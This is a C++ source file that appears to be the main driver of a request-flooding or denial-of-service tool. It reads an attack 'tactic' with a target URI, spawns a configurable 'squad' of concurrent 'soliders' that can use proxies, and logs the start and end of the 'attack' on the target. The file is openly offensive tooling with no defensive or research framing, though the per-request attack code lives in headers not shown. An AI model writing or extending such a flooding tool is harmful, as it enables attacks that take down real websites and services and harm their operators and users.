#include <csignal>

#include <memory>
#include <optional>
#include <string>
#include <thread>
#include <chrono>
#include <atomic>

#include "api_interface.h"
#include "logging.h"
#include "setup.h"
#include "solider.h"
#include "multithread.h"
#include "static_target.hpp"
#include "target.hpp"

static TaskController g_mainTask;

Attackers::PTarget ProduceTarget(const Attackers::Tactic &tactic)
{
	return std::make_unique<Attackers::StaticTarget>(tactic.coordintates, tactic.method);
}

void signalHanlder(int) 
{
	g_mainTask.SendStop();
}

std::vector<Solider> CreateSquad(const Attackers::Tactic &tactic)
{
	auto target{ProduceTarget(tactic)};
	auto proxyGetter{std::make_shared<EmptyProxyGetter>()};
	std::vector<Solider> squad;

	squad.reserve(tactic.squadSize);
	for(size_t i = 0; i < tactic.squadSize; i++)
	{
		squad.emplace_back(target, proxyGetter);
	}

	return squad;
}

int main(int argc, char **argv)
{
	std::signal(SIGTERM, signalHanlder);
	std::signal(SIGINT, signalHanlder);
	std::signal(SIGHUP, signalHanlder);

	Args::CmdLine cmd{argc, argv};
	if(!Setup::SetupArgs(cmd))
	{
		return -1;
	}

	if(!Setup::SetupLogging())
	{
		return -1;
	}

	const auto tactic = Setup::GetTactic(cmd);
	if(!tactic)
	{
		return -1;
	}

	g_mainTask.StartExecution();

	SPDLOG_INFO("Beggining attack on {}", tactic->coordintates.GetFullURI());
	SPDLOG_INFO("Dispatching {} soliders", tactic->squadSize);

	auto squad{CreateSquad(*tactic)};
	for(auto &solider : squad)
	{
		solider.StartExecution();
	}

	while(!g_mainTask.ShouldStop())
	{ }

	SPDLOG_WARN("Stopping, please be patient");

	for(auto &solider : squad)
	{
		solider.SendStop();
	}

	for(auto &solider : squad)
	{
		solider.WaitTillEnd();
	}

	SPDLOG_INFO("Attack finished, closing gracefully");
	spdlog::drop_all();
}
